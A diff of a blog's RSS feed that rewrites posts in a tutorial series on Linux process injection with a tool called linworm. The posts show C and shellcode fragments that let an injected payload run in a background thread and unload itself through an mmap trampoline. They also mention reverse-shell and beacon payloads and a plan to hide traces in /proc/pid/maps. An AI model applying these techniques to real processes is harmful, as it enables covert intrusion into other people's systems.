@@ -6,24 +6,23 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Thu, 10 Sep 2026 16:30:00 +0800</lastBuildDate>
+        <lastBuildDate>Fri, 11 Sep 2026 12:40:00 +0800</lastBuildDate>
         <atom:link href="https://mathscantor.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
         
         <item>
             <title>Step-by-Step Linux Process Injection Guide Part 6 - Unloading the Payload</title>
             <link>https://mathscantor.github.io/posts/linux-processing-injection-guide/part-6-unloading-payload/</link>
-            <pubDate>Thu, 10 Sep 2026 16:30:00 +0800</pubDate>
+            <pubDate>Fri, 11 Sep 2026 12:40:00 +0800</pubDate>
             <guid>https://mathscantor.github.io/posts/linux-processing-injection-guide/part-6-unloading-payload/</guid>
             <description>&lt;h2 id=&#34;1-introduction&#34;&gt;1. Introduction&lt;/h2&gt;
-&lt;p&gt;Part 5 left a payload running in a background thread. That worker has two ways out: the operator sends &lt;code&gt;SIGUSR2&lt;/code&gt; while the target is still alive, or the target process exits and the destructor joins the thread.&lt;/p&gt;
-&lt;p&gt;This article walks both paths through &lt;span style=&#34;font-family: Courier, monospace; font-weight: 600;&#34;&gt;src/payload/common.c&lt;/span&gt;, starting with the operator-controlled one.&lt;/p&gt;
-&lt;h2 id=&#34;2-two-opens-two-closes&#34;&gt;2. Two Opens, Two Closes&lt;/h2&gt;
-&lt;p&gt;Up to this point the target has called &lt;span style=&#34;font-family: Courier, monospace; font-weight: 600;&#34;&gt;dlopen()&lt;/span&gt; twice on the same payload. Part 4&amp;rsquo;s injector called &lt;span style=&#34;font-family: Courier, monospace; font-weight: 600;&#34;&gt;dlopen()&lt;/span&gt; inside the target. Part 5&amp;rsquo;s &lt;span style=&#34;font-family: Courier, monospace; font-weight: 600;&#34;&gt;payload_init()&lt;/span&gt; called it again with &lt;code&gt;RTLD_NOLOAD&lt;/code&gt; and stored &lt;code&gt;g_self_handle&lt;/code&gt;. Opening the same object again returns the same handle. To unload that object, &lt;span style=&#34;font-family: Courier, monospace; font-weight: 600;&#34;&gt;dlclose()&lt;/span&gt; has to be called as many times as &lt;span style=&#34;font-family: Courier, monospace; font-weight: 600;&#34;&gt;dlopen()&lt;/span&gt; succeeded.&lt;/p&gt;</description>
+&lt;p&gt;Part 5 left a payload running in the background without stopping the target program. At some point, that work must end and its shared library must be removed.&lt;/p&gt;
+&lt;p&gt;There are two ways this can happen. We can send &lt;code&gt;SIGUSR2&lt;/code&gt; to remove the library while the target keeps running, or we can let the target exit normally and clean up the worker as part of its shutdown. This article follows both paths through &lt;span style=&#34;font-family: Courier, monospace; font-weight: 600;&#34;&gt;src/payload/common.c&lt;/span&gt;.&lt;/p&gt;</description>
             <content type="html"><![CDATA[<h2 id="1-introduction">1. Introduction</h2>
-<p>Part 5 left a payload running in a background thread. That worker has two ways out: the operator sends <code>SIGUSR2</code> while the target is still alive, or the target process exits and the destructor joins the thread.</p>
-<p>This article walks both paths through <span style="font-family: Courier, monospace; font-weight: 600;">src/payload/common.c</span>, starting with the operator-controlled one.</p>
+<p>Part 5 left a payload running in the background without stopping the target program. At some point, that work must end and its shared library must be removed.</p>
+<p>There are two ways this can happen. We can send <code>SIGUSR2</code> to remove the library while the target keeps running, or we can let the target exit normally and clean up the worker as part of its shutdown. This article follows both paths through <span style="font-family: Courier, monospace; font-weight: 600;">src/payload/common.c</span>.</p>
 <h2 id="2-two-opens-two-closes">2. Two Opens, Two Closes</h2>
-<p>Up to this point the target has called <span style="font-family: Courier, monospace; font-weight: 600;">dlopen()</span> twice on the same payload. Part 4&rsquo;s injector called <span style="font-family: Courier, monospace; font-weight: 600;">dlopen()</span> inside the target. Part 5&rsquo;s <span style="font-family: Courier, monospace; font-weight: 600;">payload_init()</span> called it again with <code>RTLD_NOLOAD</code> and stored <code>g_self_handle</code>. Opening the same object again returns the same handle. To unload that object, <span style="font-family: Courier, monospace; font-weight: 600;">dlclose()</span> has to be called as many times as <span style="font-family: Courier, monospace; font-weight: 600;">dlopen()</span> succeeded.</p>
+<p>Before following either path, we need to understand why the library must be closed twice. The part of the program that loads shared libraries keeps a count of how many times each one has been opened. A library remains loaded until that count returns to zero.</p>
+<p>In our case, the count is two. The injector opened the payload in Part 4, and the setup code in Part 5 opened it again to save a reference for later. Both calls refer to the same loaded library, but each one increases the count. Removing the library therefore requires two matching calls to <span style="font-family: Courier, monospace; font-weight: 600;">dlclose()</span>.</p>
 <p>The <code>dlopen(3)</code> man page says the same thing:</p>
 <blockquote>
 <p><em>If the same shared object is opened again with dlopen(), the same object
@@ -32,30 +31,22 @@ object handles, so a dynamically loaded shared object is not deallocated
 until dlclose() has been called on it as many times as dlopen() has
 succeeded on it.</em></p>
 </blockquote>
-<p>That is why later in this article you will see two calls to <span style="font-family: Courier, monospace; font-weight: 600;">dlclose()</span>.</p>
+<p>This is why the self-removal code later in this article closes the library twice.</p>
 <h2 id="3-the-unload-flow">3. The Unload Flow</h2>
-<p>Two scenarios must be accounted for:</p>
-<ol>
-<li>The payload teardown is triggered externally via <code>SIGUSR2</code>.</li>
-<li>The target process exits.</li>
-</ol>
-<p>The diagram below is a high-level overview of <em>linworm&rsquo;s</em> design for unloading the shared library payload.</p>
+<p>The two shutdown paths begin differently but meet at the worker. In both cases, the worker is told to stop and is woken if it is waiting. What happens after the worker finishes depends on whether the target is staying alive or exiting.</p>
+<p>The diagram below shows the complete flow:</p>
 <p>
 <pre class="mermaid">flowchart TD
-    worker["Worker looping on payload_running()"]
+    worker["Background worker is running"]
     worker --> howStop{"How does it stop?"}
-    howStop -->|SIGUSR2| handler["payload_signal_handler()"]
-    handler --> flagsUsr2["g_running=0, g_signal_shutdown=1, write pipe"]
-    howStop -->|"process exit"| dtor["on_unload()"]
-    dtor --> pstop["payload_stop()"]
-    pstop --> flagsExit["g_running=0, write pipe"]
-    flagsUsr2 --> wake["Worker wakes, user thread returns"]
-    flagsExit --> wake
-    wake --> wrapper["payload_thread_wrapper()"]
-    wrapper --> check{"g_signal_shutdown set?"}
-    check -->|yes| self_unload["payload_self_unload()"]
-    self_unload --> tramp["Anonymous trampoline: dlclose x2, pthread_exit"]
-    check -->|no| join["pthread_join, then close pipe"]</pre>
+    howStop -->|SIGUSR2| signalRequest["Record the request and wake the worker"]
+    howStop -->|"normal process exit"| normalExit["Ask the worker to stop and wake it"]
+    signalRequest --> wake["Worker finishes its task and returns"]
+    normalExit --> wake
+    wake --> check{"Does the target keep running?"}
+    check -->|yes| separateCode["Run the final steps from separate memory"]
+    separateCode --> selfRemove["Close the library twice and end the worker"]
+    check -->|no| joinWorker["Wait for the worker and close the wake-up channel"]</pre>
 
 <link href="/posts/css/caption.css" rel="stylesheet">
 
@@ -69,9 +60,8 @@ succeeded on it.</em></p>
 </span>
 <br><br></p>
 <h3 id="31-self-unload">3.1 Self-Unload</h3>
-<p>Before we begin, recall Listing 2 in Part 5 of this series, which shows the function definition of <span style="font-family: Courier, monospace; font-weight: 600;">payload_init()</span>. Inside this function is the second call to <span style="font-family: Courier, monospace; font-weight: 600;">dlopen()</span> with <code>RTLD_NOLOAD</code> to get the handle. To fully unload our payload library from the target, we will have to call <span style="font-family: Courier, monospace; font-weight: 600;">dlclose()</span> twice.</p>
-<p>With that in mind, let us go through the self-unload flow.</p>
-<p>When the target process receives <code>SIGUSR2</code>, the signal is caught by <span style="font-family: Courier, monospace; font-weight: 600;">payload_signal_handler()</span>. POSIX only allows async-signal-safe work inside a handler. <span style="font-family: Courier, monospace; font-weight: 600;">dlclose()</span>, <span style="font-family: Courier, monospace; font-weight: 600;">mmap()</span>, and <span style="font-family: Courier, monospace; font-weight: 600;">dlsym()</span> are not on that list, so they cannot run here.</p>
+<p>The <a href="/posts/linux-processing-injection-guide/part-5-weaponizing-payloads/#22-the-common-framework">initialization sequence from Part 5</a> saved the second library reference that this path needs. We can now use both references to remove the payload without stopping the target.</p>
+<p>The process begins when the target receives <code>SIGUSR2</code>. Linux can deliver this request in the middle of almost any operation, so the code that receives it must do as little as possible. This code is called a signal handler. It can only use a small set of operations that are safe when other work has been interrupted. Removing the library, finding functions, and creating memory are not among those safe operations, so they must happen later.</p>
 <p>According to the <code>signal-safety(7)</code> man page:</p>
 <blockquote>
 <p><em>An  async-signal-safe  function  is  one  that can be safely called from</em>
@@ -88,7 +78,7 @@ succeeded on it.</em></p>
 <p><em>Generally, the second choice is difficult in programs of any complexity,</em>
 <em>so the first choice is taken.</em></p>
 </blockquote>
-<p>So the handler only sets <code>volatile sig_atomic_t</code> flags and writes a single byte to the pipe. <span style="font-family: Courier, monospace; font-weight: 600;">write()</span> on a pipe <em>is</em> async-signal-safe. The rest of the teardown happens later, on the worker thread.</p>
+<p>For this reason, the handler only records what should happen and writes one byte to the wake-up channel. Writing that byte is safe here. The worker performs the rest of the shutdown after it wakes:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">payload_signal_handler</span>(<span style="color:#66d9ef">int</span> sig) {
 </span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">void</span>)sig;
 </span></span><span style="display:flex;"><span>    g_running <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
@@ -106,10 +96,7 @@ succeeded on it.</em></p>
     <br><br>
   
 </span>
-<p>So what happens next? Assuming that our payload thread is currently sleeping:</p>
-<ol>
-<li>
-<p>By writing a byte to the pipe, <span style="font-family: Courier, monospace; font-weight: 600;">payload_sleep_ms()</span> will return early instead of timing out.</p>
+<p>These few lines produce three results. First, the byte ends the worker&rsquo;s current wait instead of making it sit until the time runs out:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">payload_sleep_ms</span>(<span style="color:#66d9ef">int</span> ms) {
 </span></span><span style="display:flex;"><span>    ...
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">poll</span>(<span style="color:#f92672">&amp;</span>pfd, <span style="color:#ae81ff">1</span>, ms); <span style="color:#75715e">// &lt;- poll() will immediately return instead of timing out
@@ -125,9 +112,7 @@ succeeded on it.</em></p>
     <br><br>
   
 </span>
-</li>
-<li>
-<p>By setting <code>g_running = 0</code>, <span style="font-family: Courier, monospace; font-weight: 600;">payload_running()</span> will return false, triggering the start of the teardown in the user-defined threaded function running the payload.</p>
+<p>Second, the worker&rsquo;s next check tells it to leave its loop and finish its own cleanup:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">payload_running</span>(<span style="color:#66d9ef">void</span>) {
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> g_running <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>;   <span style="color:#75715e">// 0 != 0 --&gt; false
 </span></span></span><span style="display:flex;"><span>}
@@ -141,9 +126,7 @@ succeeded on it.</em></p>
     <br><br>
   
 </span>
-</li>
-<li>
-<p>By setting <code>g_signal_shutdown = 1</code>, it tells <span style="font-family: Courier, monospace; font-weight: 600;">payload_thread_wrapper()</span> that the teardown is happening because <code>SIGUSR2</code> was issued to our target process, resulting in a call to <span style="font-family: Courier, monospace; font-weight: 600;">payload_self_unload()</span>.</p>
+<p>Third, the saved reason tells the surrounding code that the target is staying alive, so the library must remove itself:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">payload_thread_wrapper</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>arg) {
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">g_user_thread_func</span>(arg);     <span style="color:#75715e">// Our user-defined threaded function returns here
 </span></span></span><span style="display:flex;"><span>
@@ -162,9 +145,7 @@ succeeded on it.</em></p>
     <br><br>
   
 </span>
-</li>
-</ol>
-<p>The first thing <span style="font-family: Courier, monospace; font-weight: 600;">payload_self_unload()</span> does is close the self-pipe and set both ends to <code>-1</code>. That is not housekeeping for its own sake. The last <span style="font-family: Courier, monospace; font-weight: 600;">dlclose()</span> will run the library&rsquo;s destructor, <span style="font-family: Courier, monospace; font-weight: 600;">on_unload()</span>, and that destructor calls <span style="font-family: Courier, monospace; font-weight: 600;">payload_stop()</span> whenever <code>g_pipe_fd[0] != -1</code>. If the pipe were still open, <span style="font-family: Courier, monospace; font-weight: 600;">payload_stop()</span> would <span style="font-family: Courier, monospace; font-weight: 600;">pthread_join()</span> the <em>current</em> thread and deadlock. Closing first makes <span style="font-family: Courier, monospace; font-weight: 600;">on_unload()</span> a no-op on this path.</p>
+<p>The worker is now ready to remove the library that contains its own code. It begins by closing both ends of the wake-up channel. This prevents the library&rsquo;s normal exit code from trying to wait for the current worker when the final reference is closed. A worker cannot finish while it is waiting for itself to finish, so that would leave it stuck forever. Closing the channel tells the normal exit code that this cleanup has already been handled.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">payload_self_unload</span>(<span style="color:#66d9ef">void</span>) {
 </span></span><span style="display:flex;"><span>    ...
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(g_pipe_fd[<span style="color:#ae81ff">0</span>]);
@@ -182,7 +163,7 @@ succeeded on it.</em></p>
     <br><br>
   
 </span>
-<p>Next, we will need to obtain the address of the target&rsquo;s <span style="font-family: Courier, monospace; font-weight: 600;">dlclose()</span> and <span style="font-family: Courier, monospace; font-weight: 600;">pthread_exit()</span>.</p>
+<p>Next, the worker finds the two routines needed for the final steps: one removes a library reference, and the other ends the worker.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">payload_self_unload</span>(<span style="color:#66d9ef">void</span>) {
 </span></span><span style="display:flex;"><span>    ...
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>dlclose_addr <span style="color:#f92672">=</span> <span style="color:#a6e22e">dlsym</span>(RTLD_DEFAULT, <span style="color:#e6db74">&#34;dlclose&#34;</span>);
@@ -201,8 +182,8 @@ succeeded on it.</em></p>
     <br><br>
   
 </span>
-<p>Here comes the trickier part &ndash; <span style="font-family: Courier, monospace; font-weight: 600;">payload_self_unload()</span> cannot just call <span style="font-family: Courier, monospace; font-weight: 600;">dlclose()</span> in C and return. We have to remember that our instruction pointer is still inside the payload. Once the last reference is dropped, that mapping is gone and the next instruction would fetch from unmapped memory.</p>
-<p>So the remaining <span style="font-family: Courier, monospace; font-weight: 600;">dlclose()</span> and <span style="font-family: Courier, monospace; font-weight: 600;">pthread_exit()</span> calls have to run from somewhere that survives the unmap. <a href="/posts/linux-processing-injection-guide/part-3-shellcode-and-remote-calls/#3-finding-an-injection-site">Part 3&rsquo;s trampoline</a> is the wrong tool for this. That trampoline lives in the target&rsquo;s existing executable mapping and is driven by <span style="font-family: Courier, monospace; font-weight: 600;">ptrace()</span> from the injector. Self-unload runs <em>inside</em> the payload thread, with no injector attached. After the last <span style="font-family: Courier, monospace; font-weight: 600;">dlclose()</span>, the <code>.text</code> section of our shared library payload is gone, so the leftover instructions must live in a mapping that is not the library. An anonymous <span style="font-family: Courier, monospace; font-weight: 600;">mmap()</span> page is that mapping.</p>
+<p>The difficult part is choosing where to run those final steps. The worker cannot remove its own library and then continue to the next line, because that next line is also part of the library being removed. Once the second reference is closed, the memory containing the payload&rsquo;s code is no longer available.</p>
+<p>The last few instructions must therefore live in a separate area of memory that remains available after the library is gone. This small block of temporary instructions is called a trampoline. Unlike <a href="/posts/linux-processing-injection-guide/part-3-shellcode-and-remote-calls/#3-finding-an-injection-site">the trampoline in Part 3</a>, this one cannot rely on the injector because no injector is attached during self-removal. The worker creates a new page of memory that is not tied to any file and uses it for the final steps:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">payload_self_unload</span>(<span style="color:#66d9ef">void</span>) {
 </span></span><span style="display:flex;"><span>    ...
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">long</span> page_size <span style="color:#f92672">=</span> <span style="color:#a6e22e">sysconf</span>(_SC_PAGESIZE);
@@ -222,7 +203,7 @@ succeeded on it.</em></p>
     <br><br>
   
 </span>
-<p>On x86_64, the shellcode that goes into the trampoline is as follows:</p>
+<p>On x86_64, the temporary instructions are:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/* Stack alignment */</span>
 </span></span><span style="display:flex;"><span>and  rsp, <span style="color:#f92672">-</span><span style="color:#ae81ff">16</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">/* Calling dlclose(handle) twice */</span>
@@ -246,8 +227,8 @@ succeeded on it.</em></p>
     <br><br>
   
 </span>
-<p>The two calls to <span style="font-family: Courier, monospace; font-weight: 600;">dlclose()</span> drop both references to our shared library payload (the injector&rsquo;s <span style="font-family: Courier, monospace; font-weight: 600;">dlopen()</span> and the <code>RTLD_NOLOAD</code> handle from <span style="font-family: Courier, monospace; font-weight: 600;">payload_init()</span>). Then <span style="font-family: Courier, monospace; font-weight: 600;">pthread_exit()</span> ends the thread from the trampoline.</p>
-<p><span style="font-family: Courier, monospace; font-weight: 600;">payload_self_unload()</span> never returns into the <code>.text</code> section of our shared library payload. After writing the trampoline it detaches the current thread, so <span style="font-family: Courier, monospace; font-weight: 600;">pthread_exit()</span> does not leave a joinable zombie, and jumps to the anonymous page:</p>
+<p>The first two calls remove the two library references described earlier. The final call ends the worker. Because all three calls run from the separate page, execution never tries to return to code that has already been removed.</p>
+<p>Before jumping to that page, the worker marks itself as no longer needing another thread to wait for it. It then transfers control to the temporary instructions:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">payload_self_unload</span>(<span style="color:#66d9ef">void</span>) {
 </span></span><span style="display:flex;"><span>    ...
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pthread_detach</span>(<span style="color:#a6e22e">pthread_self</span>());
@@ -263,10 +244,10 @@ succeeded on it.</em></p>
     <br><br>
   
 </span>
-<p>After the last <span style="font-family: Courier, monospace; font-weight: 600;">dlclose()</span>, our shared library payload is no longer referenced. However, the anonymous page is still mapped. (Something to work on in the future)
+<p>After the second close, the shared library is gone and the target continues running. The temporary page remains in memory, however, because the worker cannot remove the page while it is still executing code from it. This is a limitation of the current design as of commit <a href="https://github.com/mathscantor/linworm/commit/0e6e2d8ccd5dee998acd26bf8bb4b2ca48d048f0">0e6e2d8</a>.
 <br><br></p>
 <h3 id="32-process-exit">3.2 Process Exit</h3>
-<p>When the target process exits, unloading is a lot simpler. The runtime calls our destructor, <span style="font-family: Courier, monospace; font-weight: 600;">on_unload()</span>, which calls <span style="font-family: Courier, monospace; font-weight: 600;">payload_stop()</span> as long as the self-pipe is still open.</p>
+<p>When the target process exits normally, cleanup is much simpler because the entire process is about to disappear. As part of its shutdown, the program automatically runs the library&rsquo;s cleanup function. If the wake-up channel is still open, this function asks the worker to stop:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">__attribute__</span>((destructor))
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">on_unload</span>(<span style="color:#66d9ef">void</span>) {
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (g_pipe_fd[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
@@ -282,7 +263,8 @@ succeeded on it.</em></p>
     <br><br>
   
 </span>
-<p>As before, we set <code>g_running = 0</code> so the user-defined payload thread leaves its loop, and writing a byte to the pipe makes <span style="font-family: Courier, monospace; font-weight: 600;">payload_sleep_ms()</span> return early.</p>
+<p>This path only applies to a normal exit. An immediate termination, such as <code>SIGKILL</code>, does not give the program a chance to run cleanup code.</p>
+<p>The stop function records that the worker should finish and writes one byte to the wake-up channel. As before, this byte ends the worker&rsquo;s current wait immediately:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">payload_stop</span>(<span style="color:#66d9ef">void</span>) {
 </span></span><span style="display:flex;"><span>    g_running <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> byte <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
@@ -299,7 +281,7 @@ succeeded on it.</em></p>
     <br><br>
   
 </span>
-<p>This path does not set <code>g_signal_shutdown</code>, so when the user thread returns, <span style="font-family: Courier, monospace; font-weight: 600;">payload_thread_wrapper()</span> does <strong>not</strong> call <span style="font-family: Courier, monospace; font-weight: 600;">payload_self_unload()</span>. The destructor then <span style="font-family: Courier, monospace; font-weight: 600;">pthread_join()</span>s that worker and closes the pipe.</p>
+<p>Unlike the <code>SIGUSR2</code> path, this path does not ask the library to remove itself while the target is running. Once the worker finishes, the cleanup function waits for it to end and closes both ends of the wake-up channel:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">payload_stop</span>(<span style="color:#66d9ef">void</span>) {
 </span></span><span style="display:flex;"><span>    ...
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pthread_join</span>(g_thread, NULL);
@@ -320,18 +302,15 @@ succeeded on it.</em></p>
   
 </span>
 <h2 id="4-conclusion">4. Conclusion</h2>
-<p>In this article, we have discussed two ways to gracefully unload our shared library payload:</p>
-<ul>
-<li>Send a signal and the payload unloads itself while the target keeps running.</li>
-<li>Let the target exit, and the destructor just waits for the worker to finish &ndash; the library goes away with the process.</li>
-</ul>
-<p>The important lesson here when tearing the library down is not to do it from inside its own code.</p>
-<p>For the final part of this series, we will go the extra mile to hide our shared library path, and hopefully find a way to drop our anonymous page that was left behind during the signal-driven teardown.</p>
+<p>The payload now has a clean way to stop in both situations. If the target must keep running, <code>SIGUSR2</code> wakes the worker and moves the final removal steps into separate memory. If the target is exiting normally, its cleanup simply wakes the worker, waits for it, and closes the wake-up channel.</p>
+<p>The key rule is that the final instructions cannot remain inside the library they are removing. A separate page of memory solves that problem, although the page itself remains after the library is gone.</p>
+<p>In Part 7, we will turn our attention to hide our traces in <span style="font-family: Courier, monospace; font-weight: 600;">/proc/pid/maps</span>, inspired by <a href="https://github.com/magisterquis/sneaky_remap">Github magisterquis/sneaky_remap</a></p>
 <h2 id="5-references">5. References</h2>
 <ol>
 <li><a href="https://github.com/mathscantor/linworm">mathscantor/linworm (GitHub)</a></li>
 <li><a href="https://man7.org/linux/man-pages/man3/dlopen.3.html">dlopen(3) (Linux man-pages)</a></li>
 <li><a href="https://man7.org/linux/man-pages/man7/signal-safety.7.html">signal-safety(7) (Linux man-pages)</a></li>
+<li><a href="https://github.com/magisterquis/sneaky_remap">magisterquis/sneaky_remap (Github)</a></li>
 </ol>
 ]]></content>
         </item>
@@ -342,17 +321,18 @@ succeeded on it.</em></p>
             <pubDate>Fri, 04 Sep 2026 10:00:00 +0800</pubDate>
             <guid>https://mathscantor.github.io/posts/linux-processing-injection-guide/part-5-weaponizing-payloads/</guid>
             <description>&lt;h2 id=&#34;1-introduction&#34;&gt;1. Introduction&lt;/h2&gt;
-&lt;p&gt;Part 4 loaded a shared library into the target and ran a constructor that printed a single line to stdout. That proves injection works, but it is not very useful on its own. A real payload needs to keep running (holding a shell open, beaconing home, or patching the target&amp;rsquo;s behaviour) without freezing the process it just hijacked.&lt;/p&gt;
-&lt;p&gt;&lt;em&gt;linworm&lt;/em&gt; solves this with a small framework that every payload shares. The constructor starts a background thread; the framework gives that thread a way to sleep, a way to stop, and a &lt;code&gt;SIGUSR2&lt;/code&gt; path that later lets the library unload itself. This article walks through that design, then shows three payloads built on top of it: a reverse shell, a heartbeat beacon, and a runtime memory patcher.&lt;/p&gt;</description>
+&lt;p&gt;In Part 4, we loaded a shared library into another process and made it print a line. This proved that the injection worked, but the library stopped doing anything as soon as that line appeared. A useful payload must be able to keep a shell open, send regular messages, or change the program&amp;rsquo;s behaviour without stopping the program itself.&lt;/p&gt;
+&lt;p&gt;To make that possible, &lt;em&gt;linworm&lt;/em&gt; gives each payload its own worker. The worker runs in the background while the rest of the program continues as normal. It can also be woken when it is time to stop, so the payload does not have to wait for its next task before shutting down.&lt;/p&gt;</description>
             <content type="html"><![CDATA[<h2 id="1-introduction">1. Introduction</h2>
-<p>Part 4 loaded a shared library into the target and ran a constructor that printed a single line to stdout. That proves injection works, but it is not very useful on its own. A real payload needs to keep running (holding a shell open, beaconing home, or patching the target&rsquo;s behaviour) without freezing the process it just hijacked.</p>
-<p><em>linworm</em> solves this with a small framework that every payload shares. The constructor starts a background thread; the framework gives that thread a way to sleep, a way to stop, and a <code>SIGUSR2</code> path that later lets the library unload itself. This article walks through that design, then shows three payloads built on top of it: a reverse shell, a heartbeat beacon, and a runtime memory patcher.</p>
+<p>In Part 4, we loaded a shared library into another process and made it print a line. This proved that the injection worked, but the library stopped doing anything as soon as that line appeared. A useful payload must be able to keep a shell open, send regular messages, or change the program&rsquo;s behaviour without stopping the program itself.</p>
+<p>To make that possible, <em>linworm</em> gives each payload its own worker. The worker runs in the background while the rest of the program continues as normal. It can also be woken when it is time to stop, so the payload does not have to wait for its next task before shutting down.</p>
+<p>We will first look at how this worker is created and stopped. We will then use the same design to build a reverse shell, a heartbeat beacon, and a memory patcher. <a href="/posts/linux-processing-injection-guide/part-6-unloading-payload/">Part 6</a> will explain how the library is removed afterwards.</p>
 <h2 id="2-payload-handling-via-threads">2. Payload Handling via Threads</h2>
 <h3 id="21-why-threads">2.1 Why Threads?</h3>
-<p>The constructor runs on whatever thread called <span style="font-family: Courier, monospace; font-weight: 600;">dlopen()</span>. In our case that is the target&rsquo;s main thread, which the injector forced through the trampoline. If the constructor blocks (waiting for a TCP connection, for example), the whole target hangs for as long as the payload lives.</p>
-<p>Starting a dedicated thread inside the constructor avoids that. The constructor creates the thread, returns immediately, and the main thread goes back to whatever it was doing. The payload runs in the background; the target carries on as normal.</p>
+<p>When the library is loaded, its setup code runs as part of the program&rsquo;s normal work. If that setup code waits for a network connection or enters a long loop, the program must wait with it and may appear to freeze.</p>
+<p>The setup code therefore creates a separate worker and returns immediately. The program can then continue from where it was paused while the worker handles the payload in the background.</p>
 <h3 id="22-the-common-framework">2.2 The Common Framework</h3>
-<p>Every payload in <span style="font-family: Courier, monospace; font-weight: 600;">src/payload/</span> links against <span style="font-family: Courier, monospace; font-weight: 600;">src/payload/common.c</span>. The idea is always the same: initialise, start a thread, loop until told to stop, then clean up.</p>
+<p>Every payload in <span style="font-family: Courier, monospace; font-weight: 600;">src/payload/</span> uses the shared helper in <span style="font-family: Courier, monospace; font-weight: 600;">src/payload/common.c</span>. Although the payloads perform different tasks, they all follow the same sequence: prepare the worker, start it, keep it running until a stop request arrives, and then clean up.</p>
